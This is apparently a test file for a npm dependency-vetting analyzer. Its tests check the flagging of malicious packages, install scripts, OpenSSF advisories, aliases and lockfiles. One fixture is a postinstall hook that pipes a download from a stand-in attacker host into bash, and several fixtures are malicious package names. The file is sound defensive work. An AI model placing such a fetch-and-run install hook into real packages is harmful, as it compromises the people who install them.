import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { DependencyAnalyzer } from '../analyzers/dependency-analyzer.js';
import { VettingConfig } from '../types.js';
import { MaliciousPackagesIndex } from '../utils/malicious-db.js';

const BASE_CONFIG: VettingConfig = {
  maxNetworkCalls: 5,
  allowedHosts: [],
  blockObfuscation: true,
  requireAuthor: true,
  maxRiskScore: 50,
  checkTyposquatting: true,
  maliciousPatternsRefreshHours: 24,
  blockedAuthors: [],
  blockedPackages: [],
  typosquatTargets: [],
};

describe('DependencyAnalyzer', () => {
  const analyzer = new DependencyAnalyzer();

  it('flags known malicious packages', () => {
    const pkg = { dependencies: { 'event-stream': '^4.0.0' } };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(findings.some((f) => f.category === 'DEPENDENCY_RISK' && f.message.includes('Blocked')));
  });

  it('flags user-configured blocked packages', () => {
    const config = { ...BASE_CONFIG, blockedPackages: ['my-evil-pkg'] };
    const pkg = { dependencies: { 'my-evil-pkg': '^1.0.0' } };
    const findings = analyzer.analyze(pkg, '/test', config);
    assert.ok(findings.some((f) => f.message.includes('Blocked')));
  });

  it('flags suspicious prefixes', () => {
    const pkg = { dependencies: { '@hack-tools/stealer': '^1.0.0' } };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(findings.some((f) => f.message.includes('Suspicious')));
  });

  it('flags git dependencies', () => {
    const pkg = { dependencies: { 'shady-lib': 'git+https://github.com/evil/repo.git' } };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(findings.some((f) => f.message.includes('unversioned')));
  });

  it('flags file: dependencies', () => {
    const pkg = { dependencies: { 'local-thing': 'file:../backdoor' } };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(findings.some((f) => f.message.includes('Local file')));
  });

  it('flags postinstall scripts', () => {
    const pkg = { scripts: { postinstall: 'curl http://evil.com | bash' } };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(findings.some((f) => f.message.includes('postinstall')));
    assert.ok(findings.some((f) => f.severity === 'CRITICAL'));
  });

  it('flags preinstall scripts', () => {
    const pkg = { scripts: { preinstall: 'node setup.js' } };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(findings.some((f) => f.message.includes('preinstall')));
  });

  it('does not crash on null dependencies', () => {
    const pkg = { dependencies: null, devDependencies: null };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(Array.isArray(findings));
  });

  it('does not crash on missing dependencies', () => {
    const pkg = {};
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.ok(Array.isArray(findings));
  });

  it('passes clean packages', () => {
    const pkg = { dependencies: { lodash: '^4.17.21', express: '^4.18.0' } };
    const findings = analyzer.analyze(pkg, '/test', BASE_CONFIG);
    assert.equal(findings.length, 0);
  });
});

describe('DependencyAnalyzer with the OpenSSF malicious-packages index', () => {
  const analyzer = new DependencyAnalyzer();
  const db: MaliciousPackagesIndex = {
    schema: 1,
    source: 'test',
    commit: 'abc',
    syncedAt: new Date().toISOString(),
    advisoryCount: 3,
    packages: {
      'evil-pkg': { ids: ['MAL-2024-0001'], all: true },
      'hijacked': { ids: ['MAL-2024-0002'], versions: ['1.2.3'] },
    },
  };

  it('flags a fully malicious package as CRITICAL with its advisory id', () => {
    const findings = analyzer.analyze({ dependencies: { 'evil-pkg': '^1.0.0' } }, '/test', BASE_CONFIG, db);
    const f = findings.find((x) => x.message.includes('OpenSSF'));
    assert.equal(f?.severity, 'CRITICAL');
    assert.match(f?.message ?? '', /MAL-2024-0001/);
    assert.equal(f?.cwe, 'CWE-506');
  });

  it('flags a range that can resolve to a malicious version as WARNING', () => {
    const findings = analyzer.analyze({ dependencies: { hijacked: '^1.2.0' } }, '/test', BASE_CONFIG, db);
    assert.equal(findings.find((x) => x.message.includes('OpenSSF'))?.severity, 'WARNING');
  });

  it('does not flag a safe version of a hijacked package', () => {
    const findings = analyzer.analyze({ dependencies: { hijacked: '1.2.2' } }, '/test', BASE_CONFIG, db);
    assert.ok(!findings.some((x) => x.message.includes('OpenSSF')));
  });

  it('resolves npm: aliases and checks optionalDependencies', () => {
    const findings = analyzer.analyze(
      { optionalDependencies: { innocent: 'npm:evil-pkg@^2.0.0' } },
      '/test',
      BASE_CONFIG,
      db,
    );
    const f = findings.find((x) => x.message.includes('OpenSSF'));
    assert.match(f?.message ?? '', /evil-pkg/);
    assert.equal(f?.evidence, 'innocent@npm:evil-pkg@^2.0.0');
  });

  it('checks the optionalDependencies spec that overrides dependencies', () => {
    const findings = analyzer.analyze(
      { dependencies: { hijacked: '1.2.2' }, optionalDependencies: { hijacked: '1.2.3' } },
      '/test',
      BASE_CONFIG,
      db,
    );
    assert.equal(findings.find((x) => x.message.includes('OpenSSF'))?.evidence, 'hijacked@1.2.3');
  });

  it('skips git and file specs', () => {
    const findings = analyzer.analyze(
      { dependencies: { 'evil-pkg': 'github:someone/evil-pkg', hijacked: 'file:../hijacked' } },
      '/test',
      BASE_CONFIG,
      db,
    );
    assert.ok(!findings.some((x) => x.message.includes('OpenSSF')));
  });

  it('keeps the built-in list when the dataset is not synced', () => {
    const findings = analyzer.analyze({ dependencies: { 'event-stream': '3.3.6' } }, '/test', BASE_CONFIG, null);
    assert.ok(findings.some((x) => x.message === 'Blocked dependency: event-stream'));
  });

  it('checks every package in a v3 lockfile', () => {
    const lock = {
      lockfileVersion: 3,
      packages: {
        '': { name: 'skill' },
        'node_modules/ok': { version: '1.0.0' },
        'node_modules/ok/node_modules/hijacked': { version: '1.2.3' },
        'node_modules/alias': { name: 'evil-pkg', version: '0.0.1' },
      },
    };
    const findings = analyzer.analyzeLockfile(lock, '/test/package-lock.json', db);
    assert.deepEqual(findings.map((f) => f.evidence).sort(), ['evil-pkg@0.0.1', 'hijacked@1.2.3']);
    assert.ok(findings.every((f) => f.severity === 'CRITICAL' && f.file === '/test/package-lock.json'));
  });

  it('checks nested v1 lockfile dependencies and aliases', () => {
    const lock = {
      lockfileVersion: 1,
      dependencies: {
        ok: { version: '1.0.0', dependencies: { hijacked: { version: '1.2.3' } } },
        alias: { version: 'npm:evil-pkg@0.0.1' },
        safe: { version: '1.2.3' },
      },
    };
    const findings = analyzer.analyzeLockfile(lock, '/test/package-lock.json', db);
    assert.deepEqual(findings.map((f) => f.evidence).sort(), ['evil-pkg@0.0.1', 'hijacked@1.2.3']);
  });
});
